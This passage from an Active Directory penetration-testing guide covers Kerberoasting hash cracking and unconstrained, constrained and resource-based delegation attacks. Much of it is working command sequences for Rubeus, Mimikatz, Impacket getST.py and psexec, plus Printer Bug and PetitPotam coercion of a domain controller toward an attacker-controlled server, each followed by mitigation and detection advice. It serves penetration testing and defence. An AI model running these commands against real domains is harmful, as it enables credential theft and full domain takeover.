    hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
  • Enumerate accounts with SPNs (Kerberoast targets): 
    Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
  • Kerberoast from Linux and request all service tickets: 
    GetUserSPNs.py corp.local/user:Password1 -dc-ip 10.10.10.1 -request -outputfile tgs_hashes.txt
  • Kerberoast from Windows with RC4 downgrade for easier cracking: 
    .\Rubeus.exe kerberoast /tgtdeleg /outfile:tgs_hashes.txt
  • Crack TGS hashes (RC4 mode 13100, AES256 mode 19700): 
    hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt

6.3 Delegation Attacks

Kerberos delegation allows a service to impersonate a user and access other services on their behalf. This is required for multi-tier applications where a front-end service needs to access a back-end database as the connecting user rather than as itself.

6.3.1 Kerberos Delegation

Kerberos delegation allows a service to impersonate a user and access other services on their behalf. This is required for multi-tier applications where a front-end service needs to access a back-end database as the connecting user rather than as itself.

Three types of delegation exist in Active Directory:

TypeIntroducedConfigurationRisk Level
UnconstrainedWindows 2000Account-level flag in ADHigh: can impersonate any user to any service
ConstrainedWindows Server 2003SPN allowlist via msDS-AllowedToDelegateToMedium: restricted to specified SPNs (but alternative service name abuse is possible)
Resource-Based Constrained (RBCD)Windows Server 2012Target service controls who can delegate via msDS-AllowedToActOnBehalfOfOtherIdentityMedium: controlled by the resource, not the delegating account

6.3.2 Unconstrained Delegation

When a service is configured for unconstrained delegation, any user that authenticates to it will have their TGT cached in the service's LSASS memory. The service can then use that TGT to impersonate the user to any other service in the domain. If a Domain Admin authenticates to a server with unconstrained delegation, their TGT is stored in memory and can be extracted.

How It Works

The TRUSTED_FOR_DELEGATION flag (UAC value 0x80000) is set on the computer or user account. When a user authenticates via Kerberos to a service on that machine, the KDC includes a copy of the user's TGT inside the service ticket (in the ok-as-delegate field). The service's LSASS process caches these forwarded TGTs.

Note: All Domain Controllers have unconstrained delegation enabled by default.
Enumeration
# PowerView - find computers with unconstrained delegation (excluding DCs)
Get-DomainComputer -Unconstrained | Where-Object {$_.DistinguishedName -notlike "*Domain Controllers*"} | Select-Object dnshostname

# AD PowerShell module
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | Select-Object Name, DNSHostName
# From Linux with ldapsearch
ldapsearch -x -H ldap://DC01.corp.local -D "user@corp.local" -w 'Password1' -b "DC=corp,DC=local" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" dNSHostName

# With CrackMapExec
crackmapexec ldap DC01.corp.local -u user -p 'Password1' -M find-delegation
Exploitation

If you have local admin on a server with unconstrained delegation, extract cached TGTs:

# Rubeus - monitor for incoming TGTs
.\Rubeus.exe monitor /interval:5 /nowrap

# Rubeus - dump all cached tickets
.\Rubeus.exe triage
.\Rubeus.exe dump /nowrap

# Mimikatz - export tickets
sekurlsa::tickets /export

# Inject a captured TGT
.\Rubeus.exe ptt /ticket:doIFGj[...base64...]
Printer Bug Coercion

The Printer Bug (MS-RPRN RpcRemoteFindFirstPrinterChangeNotification) forces a remote machine to authenticate back to an attacker-controlled host. If the attacker controls a server with unconstrained delegation, the coerced machine's TGT is captured.

# SpoolSample - coerce DC to authenticate to the unconstrained delegation server
.\SpoolSample.exe DC01.corp.local YOURSERVER.corp.local

# Monitor for the incoming TGT on YOURSERVER
.\Rubeus.exe monitor /interval:5 /filteruser:DC01$ /nowrap
# From Linux (if you have a listener set up)
python3 printerbug.py corp.local/user:Password1@DC01.corp.local YOURSERVER.corp.local

# PetitPotam alternative (MS-EFSR)
python3 PetitPotam.py YOURSERVER.corp.local DC01.corp.local -u user -p 'Password1' -d corp.local
Mitigation
  • Remove unconstrained delegation from all servers except Domain Controllers
  • Add high-value accounts (Domain Admins, service accounts) to the Protected Users group, which prevents TGT delegation
  • Enable the Account is sensitive and cannot be delegated flag on privileged accounts
  • Monitor Event ID 4624 with Logon Type 3 to detect delegation-based authentications

6.3.3 Constrained Delegation

Constrained delegation restricts which services an account can delegate to. The allowed target services are listed in the msDS-AllowedToDelegateTo attribute. It uses two Kerberos protocol extensions: S4U2Self (Service for User to Self) and S4U2Proxy (Service for User to Proxy).

How It Works (S4U2Self and S4U2Proxy)

S4U2Self allows a service to obtain a service ticket to itself on behalf of any user, even if that user has not authenticated via Kerberos. The resulting ticket is marked as forwardable if the service is trusted for delegation.

S4U2Proxy takes the forwardable ticket from S4U2Self and exchanges it for a service ticket to the target service (specified in msDS-AllowedToDelegateTo) on behalf of the impersonated user.

Combined, these allow the delegating service to obtain a service ticket for any user to any service in its allowed list, without the user ever authenticating.

Enumeration
# PowerView - find accounts with constrained delegation
Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select-Object dnshostname, msds-allowedtodelegateto
# From Linux
ldapsearch -x -H ldap://DC01.corp.local -D "user@corp.local" -w 'Password1' -b "DC=corp,DC=local" "(msDS-AllowedToDelegateTo=*)" sAMAccountName msDS-AllowedToDelegateTo

# Impacket findDelegation.py
findDelegation.py corp.local/user:Password1 -dc-ip 10.10.10.1
Exploitation from Linux
# getST.py - request a service ticket as the target user
# If the constrained delegation account's password/hash is known:
getST.py -spn cifs/DC01.corp.local -impersonate Administrator corp.local/svc_sql:Password1 -dc-ip 10.10.10.1

# With an NTLM hash
getST.py -spn cifs/DC01.corp.local -impersonate Administrator -hashes :NTHASH corp.local/svc_sql -dc-ip 10.10.10.1

# Export and use the ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@DC01.corp.local
Exploitation from Windows
# Rubeus - request TGT for the constrained delegation account, then S4U
.\Rubeus.exe asktgt /user:svc_sql /password:Password1 /nowrap

# Perform S4U2Self and S4U2Proxy
.\Rubeus.exe s4u /ticket:doIFGj[...] /impersonateuser:Administrator /msdsspn:cifs/DC01.corp.local /ptt

# Or in one step with credentials
.\Rubeus.exe s4u /user:svc_sql /rc4:NTHASH /impersonateuser:Administrator /msdsspn:cifs/DC01.corp.local /ptt
Alternative Service Abuse

The service name in the ticket is not validated by the target server. If constrained delegation allows cifs/DC01.corp.local, you can change the service class to ldap, http, host, or any other service running on that same host. This is known as alternative service name abuse.

# Rubeus - request ticket for LDAP instead of CIFS (for DCSync)
.\Rubeus.exe s4u /user:svc_sql /rc4:NTHASH /impersonateuser:Administrator /msdsspn:cifs/DC01.corp.local /altservice:ldap /ptt
# getST.py with alternative service
getST.py -spn cifs/DC01.corp.local -impersonate Administrator -altservice ldap corp.local/svc_sql:Password1 -dc-ip 10.10.10.1
Mitigation
  • Minimize the use of constrained delegation; prefer RBCD where possible
  • Protect the credentials of constrained delegation accounts with strong passwords
  • Add privileged accounts to the Protected Users group (prevents impersonation via S4U2Self)
  • Set the Account is sensitive and cannot be delegated flag on high-value accounts
  • Audit the msDS-AllowedToDelegateTo attribute regularly

6.3.4 Resource-Based Constrained Delegation (RBCD)

RBCD inverts the delegation model. Instead of the delegating account specifying which services it can delegate to, the target resource specifies which accounts can delegate to it via the msDS-AllowedToActOnBehalfOfOtherIdentity attribute. This attribute can be modified by anyone with write access to the computer object.

How It Works

RBCD uses the same S4U2Self and S4U2Proxy extensions. The key difference: S4U2Proxy checks the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on the target instead of msDS-AllowedToDelegateTo on the source. This means any account with write access to a computer object (such as the machine account's creator or an account with GenericWrite) can configure RBCD.

Prerequisites
  • Write access to the target computer's msDS-AllowedToActOnBehalfOfOtherIdentity attribute
  • A computer account (or account with an SPN) that you control. By default, any domain user can create up to 10 machine accounts (MachineAccountQuota)
# Check MachineAccountQuota
crackmapexec ldap DC01.corp.local -u user -p 'Password1' -M maq

# Create a machine account with Impacket
addcomputer.py -computer-name 'FAKE01$' -computer-pass 'FakePass123' -dc-ip 10.10.10.1 corp.local/user:Password1
Exploitation from Linux
# Step 1: Create a computer account (if needed)
addcomputer.py -computer-name 'FAKE01$' -computer-pass 'FakePass123' corp.local/user:Password1 -dc-ip 10.10.10.1

# Step 2: Set RBCD on the target computer
rbcd.py -delegate-from 'FAKE01$' -delegate-to 'TARGET$' -action write corp.local/user:Password1 -dc-ip 10.10.10.1

# Step 3: Request a service ticket via S4U
getST.py -spn cifs/TARGET.corp.local -impersonate Administrator -dc-ip 10.10.10.1 corp.local/'FAKE01$':'FakePass123'

# Step 4: Use the ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@TARGET.corp.local
Exploitation from Windows
# Create a machine account with PowerMad
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'FakePass123' -AsPlainText -Force)

# Set RBCD with PowerView
$sid = Get-DomainComputer FAKE01 -Properties objectsid | Select-Object -Expand objectsid
$sd = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
$sdBytes = New-Object byte[] ($sd.BinaryLength)
$sd.GetBinaryForm($sdBytes, 0)
Set-DomainObject TARGET$ -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$sdBytes}

# Request ticket with Rubeus
.\Rubeus.exe s4u /user:FAKE01$ /rc4:NTHASH /impersonateuser:Administrator /msdsspn:cifs/TARGET.corp.local /ptt
Detection
  • Monitor modifications to msDS-AllowedToActOnBehalfOfOtherIdentity (Event ID 5136, Directory Service Changes audit)
  • Monitor new computer account creation (Event ID 4741)
  • Audit MachineAccountQuota; consider setting it to 0
  • Review S4U2Proxy requests in Event ID 4769

Methodology
